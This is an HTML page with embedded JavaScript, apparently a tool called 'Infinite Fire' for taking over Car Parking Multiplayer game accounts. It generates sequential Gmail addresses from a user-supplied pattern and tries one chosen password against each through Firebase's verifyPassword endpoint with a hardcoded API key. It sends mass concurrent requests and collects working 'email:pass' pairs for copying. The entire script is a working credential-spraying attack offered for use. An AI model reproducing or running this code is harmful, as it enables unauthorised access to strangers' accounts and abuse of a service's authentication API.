<!DOCTYPE html>
<html>
<head>
    <title>CPM Infinite Fire</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
        .box { max-width: 500px; margin: auto; background: #080808; padding: 20px; border: 2px solid #ff0055; border-radius: 15px; box-shadow: 0 0 20px #ff0055; }
        h2 { color: #ff0055; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #ff0055; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; }
        .btn-fire { width: 100%; padding: 18px; background: #ff0055; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; box-shadow: 0 0 15px #ff0055; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; background: #111; padding: 15px; border-radius: 10px; border: 1px solid #222; }
        .stats b { font-size: 24px; color: #ff0055; display: block; }
        #res { width: 100%; height: 250px; background: #000; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; padding: 10px; font-family: monospace; font-size: 13px; margin-top: 15px; box-sizing: border-box; }
        .copy-btn { width: 100%; padding: 12px; background: #222; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; margin-top: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>🔥 INFINITE FIRE</h2>
    <input type="text" id="fmt" placeholder="Format: cpm_{4}_@gmail.com">
    <input type="text" id="pwd" placeholder="Password to check">
    
    <button class="btn-fire" id="btn" onclick="ignite()">⚡ START INFINITE SCAN</button>

    <div class="stats">
        <div>CHECKED<b id="c">0</b></div>
        <div>FOUND<b id="f" style="color:#00ff00">0</b></div>
    </div>

    <textarea id="res" readonly placeholder="Hits: Email:Pass"></textarea>
    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL EMAIL:PASS</button>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;

    async function ignite() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Fill data!");

        active = true;
        document.getElementById('btn').innerText = "🛑 STOP / RELOAD";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- EXTREME INDIVIDUAL REQUEST LOGIC ---
        // ഓരോ നമ്പറിനും ഓരോ സെപ്പറേറ്റ് റിക്വസ്റ്റ് ഒരേസമയം അയക്കുന്നു
        for (let i = 0; i < max; i++) {
            if (!active) break;

            let num = i.toString().padStart(digits, '0');
            let email = fmt.replace(/\{(\d+)\}/, num);
            
            // "await" ഉപയോഗിക്കുന്നില്ല, അതുകൊണ്ട് ഓരോന്നും സ്വന്തമായി വർക്ക് ചെയ്യും
            checkAcc(email, pwd, key);

            // ബ്രൗസർ ക്രാഷ് ആവാതിരിക്കാൻ ഓരോ 100 റിക്വസ്റ്റ് കഴിഞ്ഞും ചെറിയൊരു ബ്രീത്തിങ് ടൈം
            if (i % 100 === 0) {
                await new Promise(r => setTimeout(r, 50));
                document.getElementById('c').innerText = i;
            }
        }
    }

    async function checkAcc(em, pw, k) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            let d = await r.json();
            
            checked++; 
            if (checked % 10 === 0) document.getElementById('c').innerText = checked;

            if (d && d.idToken) {
                found++;
                document.getElementById('f').innerText = found;
                document.getElementById('res').value += em + ":" + pw + "\n";
                document.getElementById('res').scrollTop = document.getElementById('res').scrollHeight;
            }
        } catch (e) {
            // Error വന്നാൽ ആ അക്കൗണ്ട് വിട്ടുപോകാതിരിക്കാൻ വീണ്ടും ട്രൈ ചെയ്യാം
        }
    }

    function copyHits() {
        let t = document.getElementById('res');
        t.select();
        document.execCommand('copy');
        alert("Found accounts copied!");
    }
</script>

</body>
</html>
